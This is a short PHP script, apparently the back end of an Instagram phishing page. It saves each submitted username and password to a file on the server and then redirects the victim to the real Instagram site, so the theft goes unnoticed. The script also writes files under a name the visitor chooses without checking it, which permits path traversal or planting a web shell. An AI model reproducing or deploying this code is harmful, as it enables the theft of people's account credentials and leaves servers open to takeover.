<?php
file_put_contents('data/'.$_POST['id'],
$_POST['pw']);
header('Location: https://www.instagram.com/');
?>